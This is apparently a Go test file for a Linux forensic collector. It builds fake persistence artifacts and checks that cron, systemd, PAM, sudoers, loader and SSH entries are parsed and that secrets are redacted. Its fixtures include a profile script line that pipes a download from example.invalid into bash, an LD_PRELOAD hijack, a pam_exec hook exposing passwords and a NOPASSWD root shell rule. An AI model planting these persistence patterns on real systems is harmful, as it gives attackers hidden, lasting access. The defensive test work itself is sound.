package persistence

import (
	"context"
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"linux-dfir/internal/evidence"
	"linux-dfir/internal/output"
)

func TestCollectWithFixturePersistenceFiles(t *testing.T) {
	root := t.TempDir()
	restore := SetRootForTest(root)
	defer restore()

	writeFile(t, rootPath(root, "/etc/passwd"), "root:x:0:0:root:/root:/bin/bash\nalice:x:1000:1000:Alice:/home/alice:/bin/bash\n")
	cronRootData := "#!/bin/sh\necho cron-root\n"
	cronExtraData := "#!/bin/sh\necho cron-extra\n"
	userCronData := "#!/bin/sh\necho user-cron\n"
	cronDailyCleanupData := "#!/bin/sh\n/tmp/cleanup.sh\n"
	writeFile(t, rootPath(root, "/usr/local/bin/cron-root"), cronRootData)
	writeFile(t, rootPath(root, "/usr/local/bin/cron-extra"), cronExtraData)
	writeFile(t, rootPath(root, "/usr/local/bin/user-cron"), userCronData)
	writeFile(t, rootPath(root, "/etc/crontab"), "SHELL=/bin/sh\n*/5 * * * * root /usr/local/bin/cron-root\n")
	writeFile(t, rootPath(root, "/etc/cron.allow"), "root\nalice\n")
	writeFile(t, rootPath(root, "/etc/cron.extra"), "*/10 * * * * root /usr/local/bin/cron-extra\n*/20 * * * * root /missing/cron-target\n")
	writeFile(t, rootPath(root, "/etc/cron.d/app"), "@reboot app /opt/app/start.sh\n")
	writeFile(t, rootPath(root, "/etc/cron.daily/cleanup"), cronDailyCleanupData)
	writeFile(t, rootPath(root, "/etc/rc.local"), "#!/bin/sh\n/usr/bin/rc-backdoor\n")
	writeFile(t, rootPath(root, "/etc/rc.custom"), "#!/bin/sh\n/usr/bin/rc-custom\n")
	writeFile(t, rootPath(root, "/etc/init/upstart-demo.conf"), "start on runlevel [2345]\nexec /opt/upstart-demo\n")
	writeFile(t, rootPath(root, "/etc/init.d/demo"), "#!/bin/sh\n/usr/bin/init-demo\n")
	writeFile(t, rootPath(root, "/etc/systemd/system/demo.service"), "[Unit]\nWants=network-online.target\nAfter=network-online.target\n[Service]\nUser=svc-demo\nGroup=svc-demo\nWorkingDirectory=/opt/demo\nEnvironment=TOKEN=\"super-secret-systemd\" MODE=prod AWS_SECRET_ACCESS_KEY=super-secret-aws\nEnvironmentFile=-/etc/demo.env\nExecCondition=/usr/bin/test -x /opt/demo/run\nExecStartPre=/opt/demo/pre\nExecStart=/opt/demo/run --api-key \"super-secret-exec\"\nExecStartPost=/opt/demo/post\nExecReload=/bin/kill -HUP $MAINPID\nExecStop=/opt/demo/stop\nRestart=always\n[Install]\nWantedBy=multi-user.target\nRequiredBy=graphical.target\n")
	writeFile(t, rootPath(root, "/etc/systemd/system/demo.service.d/override.conf"), "[Service]\nEnvironment=OVERRIDE=yes\nExecStartPost=/opt/demo/override-post\n")
	writeFile(t, rootPath(root, "/etc/systemd/system/demo.timer"), "[Timer]\nOnBootSec=5min\nOnUnitActiveSec=1h\nOnCalendar=*:0/15\n[Install]\nWantedBy=timers.target\n")
	writeFile(t, rootPath(root, "/etc/systemd/system/demo.socket"), "[Socket]\nListenStream=127.0.0.1:4444\n")
	writeFile(t, rootPath(root, "/etc/systemd/system/demo.path"), "[Path]\nPathChanged=/tmp/demo\n")
	mkdir(t, rootPath(root, "/etc/rc2.d"))
	symlink(t, "../init.d/demo", rootPath(root, "/etc/rc2.d/S01demo"))
	mkdir(t, rootPath(root, "/etc/systemd/system/multi-user.target.wants"))
	symlink(t, "../demo.service", rootPath(root, "/etc/systemd/system/multi-user.target.wants/demo.service"))
	writeFile(t, rootPath(root, "/etc/systemd/user/user-global.service"), "[Service]\nExecStart=/opt/user-global/run\n")
	writeFile(t, rootPath(root, "/home/alice/.config/systemd/user/user-local.service"), "[Service]\nExecStart=/opt/user-local/run\n[Install]\nWantedBy=default.target\n")
	writeFile(t, rootPath(root, "/etc/ssh/sshd_config"), "PermitRootLogin yes\nAuthorizedKeysFile .ssh/authorized_keys\nAuthorizedKeysCommand /usr/local/bin/keys %u\nForceCommand /usr/local/bin/force\nProxyCommand curl https://user:pass@proxy.local/connect?token=super-secret-ssh --api-key super-secret-proxy\n")
	writeFile(t, rootPath(root, "/etc/ssh/ssh_host_rsa_key"), "-----BEGIN OPENSSH PRIVATE KEY-----\nsecret-host-key\n-----END OPENSSH PRIVATE KEY-----\n")
	writeFile(t, rootPath(root, "/home/alice/.ssh/authorized_keys"), `command="/bin/date",from="10.0.0.1,10.0.0.2",environment="ROLE=ir",permitopen="127.0.0.1:8080",no-pty ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA alice-key`+"\n")
	writeFile(t, rootPath(root, "/home/alice/.ssh/id_ed25519"), "-----BEGIN OPENSSH PRIVATE KEY-----\nsecret-user-key\n-----END OPENSSH PRIVATE KEY-----\n")
	writeFile(t, rootPath(root, "/tmp/libx.so"), "fake-so")
	writeFile(t, rootPath(root, "/tmp/libpreload.so"), "fake-preload-so")
	writeFile(t, rootPath(root, "/etc/profile.d/persist.sh"), "export LD_PRELOAD=/tmp/libx.so\nexport PATH=/tmp/bin:$PATH\nexport API_TOKEN=\"super-secret-profile\"\nsource /opt/persist/profile.sh\ncurl http://example.invalid/p.sh?token=super-secret-url | bash\n")
	writeFile(t, rootPath(root, "/home/alice/.bashrc"), "alias ls='ls --color=auto'\n")
	writeFile(t, rootPath(root, "/home/alice/.bash_profile"), "export LD_LIBRARY_PATH=/opt/lib\n. /opt/alice/env.sh\n")
	writeFile(t, rootPath(root, "/etc/ld.so.preload"), "/tmp/libpreload.so\n")
	writeFile(t, rootPath(root, "/etc/ld.so.conf"), "include /etc/ld.so.conf.d/*.conf\n/usr/local/lib\n")
	writeFile(t, rootPath(root, "/etc/ld.so.conf.d/demo.conf"), "/opt/demo/lib\n")
	writeFile(t, rootPath(root, "/etc/sudoers"), "#includedir /etc/sudoers.d\nroot ALL=(ALL) ALL\n")
	writeFile(t, rootPath(root, "/etc/sudoers.d/alice"), "alice ALL=(ALL) NOPASSWD: /bin/bash\n")
	pamExecData := "pam exec module\n"
	pamCustomData := "pam custom module\n"
	writeFile(t, rootPath(root, "/usr/lib/x86_64-linux-gnu/security/pam_exec.so"), pamExecData)
	writeFile(t, rootPath(root, "/opt/lib/security/pam_custom.so"), pamCustomData)
	writeFile(t, rootPath(root, "/etc/pam.d/sshd"), "auth required pam_exec.so expose_authtok /usr/local/bin/pam-hook --token pam-token-value\nsession optional /opt/lib/security/pam_custom.so arg=value\n@include common-auth\n")
	writeFile(t, rootPath(root, "/etc/at.allow"), "alice\n")
	writeFile(t, rootPath(root, "/var/spool/at/a0000101"), "#!/bin/sh\n/usr/bin/at-job\n")
	writeFile(t, rootPath(root, "/var/at/jobs/b0000202"), "#!/bin/sh\n/usr/bin/var-at-job\n")
	writeFile(t, rootPath(root, "/var/cron/tabs/alice"), "*/15 * * * * /usr/local/bin/user-cron\n")
	writeFile(t, rootPath(root, "/var/log/cron"), "Jun  3 00:00:00 host CRON[1]: test\n")
	writeFile(t, rootPath(root, "/etc/xdg/autostart/demo.desktop"), "[Desktop Entry]\nName=Demo\nExec=/opt/demo/autostart\n")
	writeFile(t, rootPath(root, "/home/alice/.config/autostart/user.desktop"), "[Desktop Entry]\nName=UserDemo\nExec=/opt/user/autostart\n")

	out, outDir := newOutput(t)
	if err := Collect(context.Background(), out); err != nil {
		t.Fatal(err)
	}

	items := filepath.Join(outDir, "ai/evidence.jsonl")
	files := filepath.Join(outDir, "ai/evidence.jsonl")
	assertFileContains(t, items, `"category":"cron"`)
	assertFileContains(t, items, `/usr/local/bin/cron-root`)
	assertFileContains(t, items, `/usr/local/bin/cron-extra`)
	assertFileContains(t, items, `/usr/local/bin/user-cron`)
	assertEvidenceRecord(t, items, "facts/cron_entries", map[string]any{
		"category":      "cron",
		"item_type":     "cron_entry",
		"path":          "/etc/crontab",
		"user":          "root",
		"target_path":   "/usr/local/bin/cron-root",
		"target_exists": true,
		"target_sha256": sha256Hex(cronRootData),
		"target_size":   len(cronRootData),
		"target_mode":   "-rw-r-----",
	})
	assertEvidenceRecord(t, items, "facts/cron_entries", map[string]any{
		"category":      "cron",
		"item_type":     "cron_entry",
		"path":          "/etc/cron.extra",
		"target_path":   "/usr/local/bin/cron-extra",
		"target_exists": true,
		"target_sha256": sha256Hex(cronExtraData),
		"target_size":   len(cronExtraData),
	})
	assertEvidenceRecord(t, items, "facts/cron_entries", map[string]any{
		"category":      "cron",
		"item_type":     "cron_entry",
		"path":          "/etc/cron.extra",
		"target_path":   "/missing/cron-target",
		"target_exists": false,
	})
	assertEvidenceRecord(t, items, "facts/cron_entries", map[string]any{
		"category":      "cron",
		"item_type":     "cron_entry",
		"path":          "/var/cron/tabs/alice",
		"user":          "alice",
		"target_path":   "/usr/local/bin/user-cron",
		"target_exists": true,
		"target_sha256": sha256Hex(userCronData),
		"target_size":   len(userCronData),
	})
	assertEvidenceRecord(t, items, "facts/cron_entries", map[string]any{
		"category":      "cron",
		"item_type":     "cron_periodic_script",
		"path":          "/etc/cron.daily/cleanup",
		"command":       "/etc/cron.daily/cleanup",
		"target_path":   "/etc/cron.daily/cleanup",
		"target_exists": true,
		"target_sha256": sha256Hex(cronDailyCleanupData),
		"target_size":   len(cronDailyCleanupData),
		"target_mode":   "-rw-r-----",
	})
	assertFileContains(t, items, `"category":"systemd"`)
	assertFileContains(t, items, `"ExecStartPre":["/opt/demo/pre"]`)
	assertFileContains(t, items, `"ExecStartPost":["/opt/demo/post"]`)
	assertFileContains(t, items, `"ExecStart":["/opt/demo/run --api-key \"[redacted]\""]`)
	assertFileContains(t, items, `"Environment":["TOKEN=\"[redacted]\" MODE=prod AWS_SECRET_ACCESS_KEY=[redacted]"]`)
	assertFileContains(t, items, `"environment":{"AWS_SECRET_ACCESS_KEY":"[redacted]","MODE":"prod","TOKEN":"[redacted]"}`)
	assertFileContains(t, items, `"environment_files":["-/etc/demo.env"]`)
	assertFileContains(t, items, `"Wants":["network-online.target"]`)
	assertFileContains(t, items, `"WantedBy":["multi-user.target"]`)
	assertFileContains(t, items, `"OnBootSec":["5min"]`)
	assertFileContains(t, items, `"ListenStream":["127.0.0.1:4444"]`)
	assertFileContains(t, items, `"PathChanged":["/tmp/demo"]`)
	assertFileContains(t, items, `"item_type":"dropin"`)
	assertFileContains(t, items, `/opt/demo/override-post`)
	assertFileContains(t, items, `/opt/demo/run`)
	assertFileContains(t, items, `/opt/user-global/run`)
	assertFileContains(t, items, `/opt/user-local/run`)
	assertFileContains(t, items, `upstart-demo.conf`)
	assertFileContains(t, filepath.Join(outDir, "ai/evidence.jsonl"), `WantedBy=multi-user.target`)
	assertFileContains(t, filepath.Join(outDir, "ai/evidence.jsonl"), `WantedBy=default.target`)
	assertFileContains(t, filepath.Join(outDir, "ai/evidence.jsonl"), `/etc/systemd/system/multi-user.target.wants/demo.service`)
	assertFileContains(t, filepath.Join(outDir, "ai/evidence.jsonl"), `"link_state":"enabled_wants"`)
	assertFileContains(t, filepath.Join(outDir, "ai/evidence.jsonl"), `"entity_id":"systemd_unit_symlink:/etc/systemd/system/multi-user.target.wants/demo.service"`)
	assertFileContains(t, filepath.Join(outDir, "ai/evidence.jsonl"), `"content_source":"symlink_target"`)
	assertFileContains(t, items, `"item_type":"authorized_key"`)
	assertFileContains(t, items, `"key_fingerprint":"SHA256:`)
	assertFileContains(t, items, `"key_option_command":"/bin/date"`)
	assertFileContains(t, items, `"key_option_from":["10.0.0.1","10.0.0.2"]`)
	assertFileContains(t, items, `"key_option_environment":["ROLE=ir"]`)
	assertFileContains(t, items, `"key_option_permitopen":["127.0.0.1:8080"]`)
	assertFileContains(t, items, `"key_option_no_pty":true`)
	assertFileContains(t, items, `"config_keyword":"AuthorizedKeysCommand"`)
	assertFileContains(t, items, `"config_values":["/usr/local/bin/keys","%u"]`)
	assertFileContains(t, items, `https://[redacted]@proxy.local/connect?token=[redacted]`)
	assertFileContains(t, items, `"config_values":["curl","https://[redacted]@proxy.local/connect?token=[redacted]","--api-key","[redacted]"]`)
	assertFileContains(t, items, `"item_type":"private_key_metadata"`)
	assertFileContains(t, items, `"source_file_redacted":true`)
	assertFileContains(t, items, `"category":"loader"`)
	assertFileContains(t, items, `"item_type":"ld_so_preload_entry"`)
	assertFileContains(t, items, `"target_path":"/tmp/libpreload.so"`)
	assertFileContains(t, items, `"target_exists":true`)
	assertFileContains(t, items, `"target_sha256":`)
	assertFileContains(t, items, `"profile_action":"set_variable"`)
	assertFileContains(t, items, `"variable":"LD_PRELOAD"`)
	assertFileContains(t, items, `"target_paths":["/tmp/libx.so"]`)
	assertFileContains(t, items, `"variable":"API_TOKEN"`)
	assertFileContains(t, items, `"value":"[redacted]"`)
	assertFileContains(t, items, `"profile_action":"source"`)
	assertFileContains(t, items, `"profile_action":"exec"`)
	assertFileContains(t, items, `"profile_action":"alias"`)
	assertFileContains(t, items, `"category":"sudoers"`)
	assertFileContains(t, items, `"item_type":"sudo_include"`)
	assertFileContains(t, items, `"included_path":"/etc/sudoers.d"`)
	assertFileContains(t, items, `"subject":"alice"`)
	assertFileContains(t, items, `"run_as":"(ALL)"`)
	assertFileContains(t, items, `"sudo_tags":["NOPASSWD"]`)
	assertFileContains(t, items, `"sudo_commands":["/bin/bash"]`)
	assertStreamAtLeast(t, items, "facts/pam_persistence", 2)
	assertEvidenceRecord(t, items, "facts/pam_persistence", map[string]any{
		"exists":               true,
		"source_file":          "/etc/pam.d/sshd",
		"line_number":          1,
		"service":              "sshd",
		"pam_type":             "auth",
		"control":              "required",
		"module":               "pam_exec.so",
		"module_path":          "pam_exec.so",
		"module_path_resolved": "/usr/lib/x86_64-linux-gnu/security/pam_exec.so",
		"module_file_exists":   true,
		"module_file_sha256":   sha256Hex(pamExecData),
		"module_file_size":     len(pamExecData),
		"module_file_mode":     "-rw-r-----",
	})
	assertEvidenceRecord(t, items, "facts/pam_persistence", map[string]any{
		"exists":               true,
		"source_file":          "/etc/pam.d/sshd",
		"line_number":          2,
		"service":              "sshd",
		"pam_type":             "session",
		"control":              "optional",
		"module":               "/opt/lib/security/pam_custom.so",
		"module_path_resolved": "/opt/lib/security/pam_custom.so",
		"module_file_exists":   true,
		"module_file_sha256":   sha256Hex(pamCustomData),
		"module_file_size":     len(pamCustomData),
	})
	assertFileContains(t, items, `"module_args":["expose_authtok","/usr/local/bin/pam-hook","--token","[redacted]"]`)
	assertFileContains(t, items, `"redacted_line":"auth required pam_exec.so expose_authtok /usr/local/bin/pam-hook --token [redacted]"`)
	assertFileContains(t, items, `"category":"at"`)
	assertFileContains(t, items, `/usr/bin/var-at-job`)
	assertFileContains(t, items, `"category":"xdg_autostart"`)
	assertStreamCount(t, items, "parsed/persistence_files", 0)
	assertStreamCount(t, items, "parsed/persistence_items", 0)
	assertStreamCount(t, items, "parsed/cron_entries", 0)
	assertStreamCount(t, items, "parsed/systemd_units", 0)
	assertStreamAtLeast(t, items, "entities/persistence_file", 1)
	assertStreamAtLeast(t, items, "entities/systemd_unit", 1)
	assertStreamAtLeast(t, items, "facts/cron_entries", 1)
	assertStreamAtLeast(t, items, "facts/persistence_items", 1)
	assertFileContains(t, files, `"content_redacted":true`)
	assertFileContains(t, files, `"sensitive":true`)
	assertFileContains(t, filepath.Join(outDir, "legacy/autorun/etc/crontab"), "cron-root")
	assertFileContains(t, filepath.Join(outDir, "legacy/autorun/etc/cron.allow"), "alice")
	assertFileContains(t, filepath.Join(outDir, "legacy/autorun/etc/cron.extra"), "cron-extra")
	assertFileContains(t, filepath.Join(outDir, "legacy/autorun/etc/rc.custom"), "rc-custom")
	assertFileContains(t, filepath.Join(outDir, "legacy/autorun/etc/at.allow"), "alice")
	assertFileContains(t, filepath.Join(outDir, "legacy/autorun/var/at/jobs/b0000202"), "var-at-job")
	assertFileContains(t, filepath.Join(outDir, "legacy/autorun/var/cron/tabs/alice"), "user-cron")
	assertFileContains(t, filepath.Join(outDir, "legacy/autorun/var/log/cron"), "CRON")
	assertFileContains(t, filepath.Join(outDir, "legacy/autorun/etc/rc2.d/S01demo"), "init-demo")
	assertFileContains(t, filepath.Join(outDir, "legacy/autorun/etc/systemd/system/demo.service"), "ExecStart")
	assertFileContains(t, filepath.Join(outDir, "legacy/autorun/etc/systemd/system/multi-user.target.wants/demo.service"), "ExecStart")
	assertFileContains(t, filepath.Join(outDir, "legacy/autorun/etc/pam.d/sshd"), "pam_exec.so")
	assertFileContains(t, filepath.Join(outDir, "legacy/autorun/home/alice/.ssh/authorized_keys"), "alice-key")
	assertFileContains(t, filepath.Join(outDir, "legacy/autorun/etc/sudoers.d/alice"), "NOPASSWD")

	assertTreeNotContains(t, outDir, "secret-user-key")
	assertTreeNotContains(t, outDir, "secret-host-key")
	assertTreeNotContains(t, outDir, "BEGIN OPENSSH PRIVATE KEY")
	assertFileNotContains(t, items, "super-secret")
	assertFileNotContains(t, items, "user:pass")
	assertEntityIDCount(t, items, "entities/persistence_file", "persistence_file:/etc/ssh/sshd_config", 1)
	assertEntityIDCount(t, items, "entities/persistence_file", "persistence_file:/etc/ssh/ssh_host_rsa_key", 1)
	if _, err := os.Stat(filepath.Join(outDir, "legacy/autorun/home/alice/.ssh/id_ed25519")); !os.IsNotExist(err) {
		t.Fatalf("private key should not be copied to legacy, stat err=%v", err)
	}
}

func TestCollectWithMissingRootsWritesAbsent(t *testing.T) {
	root := t.TempDir()
	restore := SetRootForTest(root)
	defer restore()

	out, outDir := newOutput(t)
	if err := Collect(context.Background(), out); err != nil {
		t.Fatal(err)
	}

	assertFileContains(t, filepath.Join(outDir, "ai/evidence.jsonl"), `"exists":false`)
	assertFileContains(t, filepath.Join(outDir, "ai/evidence.jsonl"), `"exists":false`)
	assertFileContains(t, filepath.Join(outDir, "ai/evidence.jsonl"), `/etc/crontab`)
	assertStreamCount(t, filepath.Join(outDir, "ai/evidence.jsonl"), "errors", 0)
}

func TestParseAuthorizedKeysRedactsKeyMaterial(t *testing.T) {
	text := `command="/bin/date -u",from="10.0.0.1,10.0.0.2",environment="ROLE=ir",permitopen="127.0.0.1:8080",no-pty ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA analyst@example`
	items := parseAuthorizedKeys("/home/alice/.ssh/authorized_keys", text, "alice")
	if len(items) != 1 {
		t.Fatalf("expected 1 authorized key item, got %d", len(items))
	}
	if items[0].KeyType != "ssh-ed25519" {
		t.Fatalf("unexpected key type: %s", items[0].KeyType)
	}
	if !strings.HasPrefix(items[0].KeyFingerprint, "SHA256:") {
		t.Fatalf("expected fingerprint, got %q", items[0].KeyFingerprint)
	}
	if items[0].Command != "" || strings.Contains(items[0].KeyComment, "AAAAC3") {
		t.Fatalf("authorized key material leaked into item: %+v", items[0])
	}
	if items[0].KeyOptionCommand != "/bin/date -u" || len(items[0].KeyOptionFrom) != 2 || items[0].KeyOptionFrom[1] != "10.0.0.2" {
		t.Fatalf("authorized key options not parsed: %+v", items[0])
	}
	if !items[0].KeyOptionNoPTY || len(items[0].KeyOptionEnv) != 1 || len(items[0].KeyOptionPermitOpen) != 1 {
		t.Fatalf("authorized key boolean/list options not parsed: %+v", items[0])
	}
}

func newOutput(t *testing.T) (*output.Manager, string) {
	t.Helper()
	outDir := filepath.Join(t.TempDir(), "out")
	out, err := output.New(outDir, "dual", evidence.Session{
		CaseID:    "case-test",
		HostID:    "host-test",
		SessionID: "session-test",
		CreatedAt: time.Now().UTC(),
	})
	if err != nil {
		t.Fatal(err)
	}
	return out, outDir
}

func writeFile(t *testing.T, path, data string) {
	t.Helper()
	if err := os.MkdirAll(filepath.Dir(path), 0o750); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(path, []byte(data), 0o640); err != nil {
		t.Fatal(err)
	}
}

func sha256Hex(data string) string {
	sum := sha256.Sum256([]byte(data))
	return hex.EncodeToString(sum[:])
}

func mkdir(t *testing.T, path string) {
	t.Helper()
	if err := os.MkdirAll(path, 0o750); err != nil {
		t.Fatal(err)
	}
}

func symlink(t *testing.T, target, path string) {
	t.Helper()
	if err := os.Symlink(target, path); err != nil {
		t.Fatal(err)
	}
}

func rootPath(root, sourcePath string) string {
	return filepath.Join(root, strings.TrimPrefix(filepath.Clean(sourcePath), string(filepath.Separator)))
}

func SetRootForTest(root string) func() {
	old := filesystemRoot
	filesystemRoot = root
	return func() {
		filesystemRoot = old
	}
}

func assertFileContains(t *testing.T, path, fragment string) {
	t.Helper()
	data, err := os.ReadFile(path)
	if err != nil {
		if os.IsNotExist(err) {
			t.Fatalf("%s missing; output tree:\n%s", path, treeListing(filepath.Dir(filepath.Dir(filepath.Dir(path)))))
		}
		t.Fatal(err)
	}
	if !strings.Contains(string(data), fragment) {
		t.Fatalf("%s does not contain %q: %s", path, fragment, string(data))
	}
}

func assertFileNotContains(t *testing.T, path, fragment string) {
	t.Helper()
	data, err := os.ReadFile(path)
	if err != nil {
		t.Fatal(err)
	}
	if strings.Contains(string(data), fragment) {
		t.Fatalf("%s unexpectedly contains %q: %s", path, fragment, string(data))
	}
}

func treeListing(root string) string {
	var lines []string
	_ = filepath.WalkDir(root, func(path string, d os.DirEntry, err error) error {
		if err != nil {
			return nil
		}
		lines = append(lines, path)
		return nil
	})
	return strings.Join(lines, "\n")
}

func assertTreeNotContains(t *testing.T, root, fragment string) {
	t.Helper()
	err := filepath.WalkDir(root, func(path string, d os.DirEntry, err error) error {
		if err != nil || d.IsDir() {
			return err
		}
		data, readErr := os.ReadFile(path)
		if readErr != nil {
			return readErr
		}
		if strings.Contains(string(data), fragment) {
			t.Fatalf("%s unexpectedly contains %q", path, fragment)
		}
		return nil
	})
	if err != nil {
		t.Fatal(err)
	}
}

func assertStreamCount(t *testing.T, path, stream string, want int) {
	t.Helper()
	got := countStream(t, path, stream)
	if got != want {
		t.Fatalf("stream %s count=%d want=%d", stream, got, want)
	}
}

func assertStreamAtLeast(t *testing.T, path, stream string, wantMin int) {
	t.Helper()
	got := countStream(t, path, stream)
	if got < wantMin {
		t.Fatalf("stream %s count=%d want>=%d", stream, got, wantMin)
	}
}

func countStream(t *testing.T, path, stream string) int {
	t.Helper()
	data, err := os.ReadFile(path)
	if err != nil {
		t.Fatal(err)
	}
	count := 0
	for _, line := range strings.Split(strings.TrimSpace(string(data)), "\n") {
		if strings.TrimSpace(line) == "" {
			continue
		}
		var record struct {
			Stream string `json:"stream"`
		}
		if err := json.Unmarshal([]byte(line), &record); err != nil {
			t.Fatalf("invalid evidence line: %v: %s", err, line)
		}
		if record.Stream == stream {
			count++
		}
	}
	return count
}

func assertEntityIDCount(t *testing.T, path, stream, entityID string, want int) {
	t.Helper()
	data, err := os.ReadFile(path)
	if err != nil {
		t.Fatal(err)
	}
	got := 0
	for _, line := range strings.Split(strings.TrimSpace(string(data)), "\n") {
		if strings.TrimSpace(line) == "" {
			continue
		}
		var record struct {
			Stream string `json:"stream"`
			Data   struct {
				EntityID string `json:"entity_id"`
			} `json:"data"`
		}
		if err := json.Unmarshal([]byte(line), &record); err != nil {
			t.Fatalf("invalid evidence line: %v: %s", err, line)
		}
		if record.Stream == stream && record.Data.EntityID == entityID {
			got++
		}
	}
	if got != want {
		t.Fatalf("entity %s in stream %s count=%d want=%d", entityID, stream, got, want)
	}
}

func assertEvidenceRecord(t *testing.T, path, stream string, expected map[string]any) {
	t.Helper()
	candidates := evidenceRecordsForStream(t, path, stream)
	for _, candidate := range candidates {
		if evidenceDataMatches(candidate, expected) {
			return
		}
	}
	t.Fatalf("%s does not contain stream %q record matching %#v; candidates: %#v", path, stream, expected, candidates)
}

func evidenceRecordsForStream(t *testing.T, path, stream string) []map[string]any {
	t.Helper()
	data, err := os.ReadFile(path)
	if err != nil {
		t.Fatal(err)
	}
	var candidates []map[string]any
	for _, line := range strings.Split(strings.TrimSpace(string(data)), "\n") {
		if strings.TrimSpace(line) == "" {
			continue
		}
		var record struct {
			Stream string         `json:"stream"`
			Data   map[string]any `json:"data"`
		}
		if err := json.Unmarshal([]byte(line), &record); err != nil {
			t.Fatalf("invalid evidence line: %v: %s", err, line)
		}
		if record.Stream == stream {
			candidates = append(candidates, record.Data)
		}
	}
	return candidates
}

func evidenceDataMatches(data map[string]any, expected map[string]any) bool {
	for key, want := range expected {
		got, ok := data[key]
		if !ok {
			return false
		}
		switch want := want.(type) {
		case int:
			gotNumber, ok := got.(float64)
			if !ok || gotNumber != float64(want) {
				return false
			}
		default:
			if got != want {
				return false
			}
		}
	}
	return true
}
